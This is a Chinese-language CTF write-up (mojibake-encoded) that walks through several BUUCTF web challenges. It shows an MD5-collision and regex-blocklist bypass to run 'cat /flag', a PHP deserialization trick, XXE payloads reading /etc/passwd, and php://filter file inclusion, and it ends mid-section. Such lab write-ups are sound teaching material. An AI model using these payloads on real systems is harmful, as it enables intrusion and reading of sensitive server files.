cat_qtL0ngçš„åšå®¢-CSDNåšå®¢</a></p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>è¿›å…¥åçœ‹åˆ°imgå‚æ•°åƒbase64ï¼Œè§£ç ä¸¤æ¬¡å†ç”¨16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ä¼šå˜æˆ555.png</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181026268.png" alt="image-20210811181026268"></p><p>æ‰€ä»¥ä¸ºäº†æƒ³è¯»å–æºç ï¼Œæˆ‘ä»¬å°†index.phpæŒ‰ç…§ç›¸åŒçš„æ–¹å¼åŠ å¯†åå˜ä¸º</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p>ä¿®æ”¹åæ›¿æ¢imgåŸæ¥çš„å€¼ï¼Œå‘ç°ä¾æ—§è¿”å›äº†ä¸€å¤§ä¸²base64ç¼–ç ï¼Œè§£ç åå¯è·å¾—æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181304356.png" alt="image-20210811181304356"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811181317988.png" alt="image-20210811181317988"></p><p>é‡ç‚¹ï¼š</p><pre class="language-none"><code class="language-none">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;        echo &#96;$cmd&#96;;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;</code></pre><p>å…ˆçœ‹ç¬¬äºŒä¸ªifé‡Œçš„md5çš„æ¯”è¾ƒï¼Œä¼ æ•°ç»„æˆ–è€…ä¼ md5å€¼ä¸º0eå¼€å¤´çš„éƒ½æ²¡æ³•ç»•è¿‡å»</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/114494427">(1æ¡æ¶ˆæ¯) æµ…è°ˆPHPä¸­å“ˆå¸Œæ¯”è¾ƒç¼ºé™·é—®é¢˜åŠå“ˆå¸Œå¼ºæ¯”è¾ƒç›¸å…³é—®é¢˜_æœ«åˆ Â· mochu7-CSDNåšå®¢</a></p><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­ - ç®€ä¹¦ (jianshu.com)</a></p><p>ä»è¿™ä¸¤ç¯‡æ–‡ç« é‡Œèƒ½æ‰¾åˆ°å­˜åœ¨æ–‡ä»¶åå…­è¿›åˆ¶å­—èŠ‚æµæ•°æ®çš„å“ˆå¸Œå€¼ç›¸ç­‰</p><p>å†è€ƒè™‘åˆ°è¦å°†ä¸€äº›ä¸å¯è§å­—ç¬¦ä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨urlç¼–ç </p><p>æœ€ç»ˆ</p><pre class="language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>è¿™é‡Œè¦ç»•è¿‡ä¸¤ä¸ªifè¯­å¥ï¼Œç„¶åæ‰§è¡Œcmdä¸­çš„å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åæ–œæ ç»•è¿‡ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ä¸‰ä¸ªåæ–œæ æ‰èƒ½åŒ¹é…åˆ°åæ–œæ ï¼Œ</p><p><a href="https://blog.csdn.net/weixin_41463193/article/details/83539168">(1æ¡æ¶ˆæ¯) ã€PHPã€‘ä¹‹4ä¸ªåæ–œæ ã€3ä¸ªåæ–œæ çš„æƒ…å†µ_Hertterçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.thinbug.com/q/28062568">ä¸ºä»€ä¹ˆ3åæ–œæ åœ¨phpä¸­ç­‰äº4åæ–œæ ï¼Ÿ - Thinbug</a></p><p>é¢˜ç›®é‡Œçš„æ­£åˆ™å…¶å®æœ‰äº›é—®é¢˜ï¼Œæ‰€ä»¥è™½ç„¶å­˜åœ¨äº†å››ä¸ªåæ–œæ ä½†æ˜¯ä¾æ—§æ²¡æœ‰è¿‡æ»¤æ‰åæ–œæ </p><p>è´´ä¸ªå¤§ä½¬çš„æ–‡ç« </p><p><a href="https://www.jianshu.com/p/076c5b422c96">ä»ä¸€é“CTFçš„éé¢„æœŸè§£çœ‹PHPåæ–œæ åŒ¹é…é—®é¢˜ - ç®€ä¹¦ (jianshu.com)</a></p><p>å¯ä»¥å…ˆç”¨diræŸ¥çœ‹ç›®å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811185153589.png" alt="image-20210811185153589"></p><p>ca\t%20/flagæ¥ç»•è¿‡ç¬¬ä¸€ä¸ªif</p><p>ç”¨\çš„åŸå› æ˜¯å› ä¸ºåœ¨linuxä¸‹è¡Œå°¾è¾“\å¯ä»¥æ¢è¡Œå¹¶ä¸”ç»§ç»­è¾“å…¥å‘½ä»¤</p><p>è¿™é‡Œæ­£åˆ™åŒ¹é…æ¼äº†uniqå’Œsortï¼Œç”¨è¿™ä¿©ä¹Ÿèƒ½æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190241730.png" alt="image-20210811190241730"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811190251827.png" alt="image-20210811190251827"></p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>å…ˆæŠ“åŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225117333.png" alt="image-20210811225117333"></p><p>å‘ç°æœ‰ä¸¤ä¸ªpostçš„å‚æ•°</p><p>ç„¶åæ ¹æ®æŠ¥é”™çš„ä¿¡æ¯</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811225205171.png" alt="image-20210811225205171"></p><p>è¿™é‡Œç”¨äº†call_user_funcå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯funcæ˜¯å‡½æ•°åï¼Œpæ˜¯å‚æ•°</p><p>ç”¨systemè¯•æ—¶å‘ç°è¢«è¿‡æ»¤äº†ï¼Œå‘ç°file_get_contentså‡½æ•°å¯ä»¥ç”¨</p><p>file_get_contentsæ‹¿æºç </p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result &#x3D; call_user_func($func, $p);    $a&#x3D; gettype($result);    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;    var $func &#x3D; &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func &#x3D; $_REQUEST[&quot;func&quot;];$p &#x3D; $_REQUEST[&quot;p&quot;];if ($func !&#x3D; null) &#123;    $func &#x3D; strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>ç”±äºè¿™ä¸ªè¿‡æ»¤ä¸å­˜åœ¨äºtestä¸­ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥æ‰§è¡Œå‘½ä»¤</p><p>åˆ©ç”¨findå‘½ä»¤æ¥æŸ¥æ‰¾æ–‡ä»¶åä¸­æœ‰flagçš„æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224457971.png" alt="image-20210811224457971"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224439715.png" alt="image-20210811224439715"></p><p>æœ€åç”¨file_get_contentsæ¥æŸ¥çœ‹æ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224611612.png" alt="image-20210811224611612"></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>çœ‹åˆ°è¿™é¢˜ç›®ç¬¬ä¸€çœ¼å°±æ„Ÿè§‰æ˜¯xxeæ¼æ´ï¼Œæ­£å¥½è¶è¿™ä¸ªæœºä¼šæŠŠxmlå­¦ä¸€ä¸‹</p><p><a href="https://xz.aliyun.com/t/6887">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_52907838/article/details/118030007">NCTF2019]Fake XML cookbook_sgnbi~çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><blockquote><p>- XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</p><p>- HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚</p></blockquote><p>åŸºæœ¬è¯­æ³•ï¼š</p><blockquote><p>- æ‰€æœ‰ XML å…ƒç´ éƒ½é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚</p><p>- XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><p>- XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚</p><p>- XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚</p><p>- XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚</p></blockquote><p>- å®ä½“å¼•ç”¨ï¼Œå¦‚æœä½ æŠŠå­—ç¬¦ &quot;&lt;&quot; æ”¾åœ¨ XMLå…ƒç´ ä¸­ï¼Œä¼šå‘ç”Ÿé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºè§£æå™¨ä¼šæŠŠå®ƒå½“ä½œæ–°å…ƒç´ çš„å¼€å§‹ã€‚è¿™æ ·ä¼šäº§ç”ŸXMLé”™è¯¯ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812002508519.png" alt="image-20210812002508519"></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--æ ¹å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span> <span class="token attr-name">category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>COOKING<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstoreçš„å­å…ƒç´ ï¼Œcategoryä¸ºå±æ€§--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Everyday Italian<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>      <span class="token comment">&lt;!--bookçš„å­å…ƒç´ ï¼Œlangä¸ºå±æ€§--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span>Giada De Laurentiis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>       <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>year</span><span class="token punctuation">></span></span>2005<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>year</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>30.00<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„å­å…ƒç´ --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookçš„ç»“æŸ--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--bookstoreçš„ç»“æŸ--></span></code></pre><p><strong>DTD</strong></p><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚DTDå¯è¢«æˆè¡Œåœ°å£°æ˜äºXMLæ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚å¸¦æœ‰DTDçš„XMLæ–‡æ¡£å®ä¾‹</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;&#x2F;to&gt;&lt;from&gt;@re&lt;&#x2F;from&gt;&lt;head&gt;v3ry&lt;&#x2F;head&gt;&lt;body&gt;g00d!&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;</code></pre><p>å½“ä½¿ç”¨å¤–éƒ¨DTDæ—¶ï¼Œé€šè¿‡å¦‚ä¸‹è¯­æ³•å¼•å…¥ã€‚</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"filename"</span><span class="token punctuation">></span></span></code></pre><p>å¤–éƒ¨DTDå®ä¾‹</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root-element</span> <span class="token name">SYSTEM</span> <span class="token string">"test.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Y0u<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>@re<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>v3ry<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>g00d!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><p>test.dtdï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">head</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--></span></code></pre><p>PCDATAçš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ã€‚PCDATAæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚</p><p><strong>å†…éƒ¨å®ä½“ç¤ºä¾‹ä»£ç </strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;Â©right;&lt;&#x2F;test&gt;</code></pre><p><strong>å¤–éƒ¨å®ä½“ç¤ºä¾‹ä»£ç </strong></p><pre class="language-none"><code class="language-none">&lt;?xml version &#x3D; &quot;1.0&quot; encoding &#x3D; &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;Â©right;&lt;&#x2F;author&gt;</code></pre><p><strong>XXEæ¼æ´ç®€ä»‹</strong></p><p>XXEæ¼æ´å…¨ç§°XML External Entity Injection å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>XXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡»ç­‰å±å®³ã€‚<br>XXEæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004625128.png" alt="image-20210812004625128"></p><p>é€šè¿‡å„ç§åè®®å¯ä»¥å®ç°xxeæ³¨å…¥ï¼Œä¾‹å¦‚åˆ©ç”¨file://æ¥è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p><p>è§£æxmlåœ¨phpåº“libxmlï¼Œlibxml&gt;=2.9.0çš„ç‰ˆæœ¬ä¸­æ²¡æœ‰XXEæ¼æ´ã€‚<br><a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>å¯ä»¥è¯»å–XML</p><p>ç®€å•çš„payload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&lt;&#x2F;xml&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><strong>é¢˜è§£ï¼š</strong></p><p>æŠ“åŒ…ï¼Œèƒ½çœ‹å‡ºæ˜¯ç”¨xmlè¿›è¡Œä¼ è¾“æ•°æ®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812003649956.png" alt="image-20210812003649956"></p><p>ç›´æ¥ä¸Špayload</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;  ]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812004223242.png" alt="image-20210812004223242"></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>çœ‹è¿™ä¸ªurlï¼Œè¯•è¯•ä¼ªåè®®è¯»å–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163436662.png" alt="image-20210812163436662"></p><p>å¤šäº†ä¸ªphp</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163515084.png" alt="image-20210812163515084"></p><p>æ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªæ¥è¯»æºç ?category=php://filter/read=convert.base64-encode/resource=index</p><p>base64è§£ç åçš„é‡ç‚¹</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$file &#x3D; $_GET[&#39;category&#39;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;include ($file . &#39;.php&#39;);&#125;else&#123;echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt;</code></pre><p>å­˜åœ¨flag.phpé¡µé¢ï¼Œä¹‹åå°±æ˜¯æƒ³åŠæ³•æŠŠä»–è¯»å‡ºæ¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812163740442.png" alt="image-20210812163740442"></p><p>æ¥ä¸‹æ¥æœ‰ä¸€ä¸ª</p><p>phpä¼ªåè®®åµŒå¥—çš„çŸ¥è¯†ç‚¹</p><p>PHPä¼ªåè®®å¯ä»¥å°†æŸä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹åŒ…å«åœ¨php://filter/convert.base64-encode/resource=flagä¸­ã€‚æ¯”å¦‚ï¼šphp://filter/convert.base64-encode/<strong>index</strong>/resource=flag</p><p>è¿™æ ·å°±èƒ½ç»•è¿‡ifçš„åˆ¤æ–­ï¼Œè¯»å–flagæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812164621882.png" alt="image-20210812164621882"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812165152600.png" alt="image-20210812165152600"></p><p>è¾“å…¥idå’Œä»·æ 